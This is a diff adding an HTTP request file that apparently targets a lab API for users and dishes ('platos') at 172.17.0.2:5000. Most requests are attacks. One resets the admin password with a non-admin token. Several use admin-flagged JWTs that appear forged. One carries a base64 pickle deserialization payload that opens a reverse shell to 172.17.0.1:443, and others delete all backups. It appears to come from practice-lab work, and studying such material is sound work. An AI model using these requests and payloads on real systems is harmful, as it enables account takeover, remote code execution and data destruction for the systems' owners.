@@ -1,0 +1,63 @@
+GET /users
+Host: 172.17.0.2:5000
+
+
+POST /users/login
+Host: 172.17.0.2:5000
+Content-Type: application/json
+
+{
+    "username": "admin",
+    "password": "test123"
+}
+
+POST /users/register
+Host: 172.17.0.2:5000
+Content-Type: application/json
+
+{
+    "username": "mago",
+    "password": "password123",
+    "email": "mago@test.htb"
+}
+
+PUT /users/change_password/admin
+Host: 172.17.0.2:5000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MjQyIiwidXNlcm5hbWUiOiJtYWdvIiwiYWRtaW4iOjAsImV4cCI6MTY4OTA0NjYxNH0.lx4BwYPba7InwbBLVzHqZfB7Zbu4h1wMCYXxJZVrCTE
+Content-Type: application/json
+
+{"password": "pwned123"}
+
+
+GET /platos
+Host: 172.17.0.2:5000
+
+# Deserializacion
+GET /platos/backup
+Host: 172.17.0.2:5000
+
+
+POST /platos/add
+Host: 172.17.0.2:5000
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MjQyIiwidXNlcm5hbWUiOiJhZG1pbiIsImFkbWluIjoxLCJleHAiOjE2ODkwNDc5NjZ9.qAfNm1uXfoqh3YWMIR1T_2sTlwkY_RMOaM3nZ5FZJOU
+
+{
+    "nombre_plato": "test",
+    "descripcion": "test",
+    "costo": 200
+}
+
+DELETE /platos/delete/hbBK87rC
+Host: 172.17.0.2:5000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MjQyIiwidXNlcm5hbWUiOiJhZG1pbiIsImFkbWluIjoxLCJleHAiOjE2ODkwNDc5NjZ9.qAfNm1uXfoqh3YWMIR1T_2sTlwkY_RMOaM3nZ5FZJOU
+
+# Serializacion
+DELETE /platos/create_backup/gASV1gAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjLtweXRob24gLWMgJ2E9X19pbXBvcnRfXztzPWEoInNvY2tldCIpO289YSgib3MiKS5kdXAyO3A9YSgicHR5Iikuc3Bhd247Yz1zLnNvY2tldChzLkFGX0lORVQscy5TT0NLX1NUUkVBTSk7Yy5jb25uZWN0KCgiMTcyLjE3LjAuMSIsNDQzKSk7Zj1jLmZpbGVubztvKGYoKSwwKTtvKGYoKSwxKTtvKGYoKSwyKTtwKCIvYmluL3NoIiknlIWUUpQu
+Host: 172.17.0.2:5000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MjQyIiwidXNlcm5hbWUiOiJhZG1pbiIsImFkbWluIjoxLCJleHAiOjE2ODkwNDk3Njh9.wBs6NunrM9A3D2dvhDLlCSmi6jd91OtBXHb3N-g1aeM
+
+
+GET /platos/backup/delete_all
+Host: 172.17.0.2:5000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MjQyIiwidXNlcm5hbWUiOiJhZG1pbiIsImFkbWluIjoxLCJleHAiOjE2ODkwNDk3Njh9.wBs6NunrM9A3D2dvhDLlCSmi6jd91OtBXHb3N-g1aeM
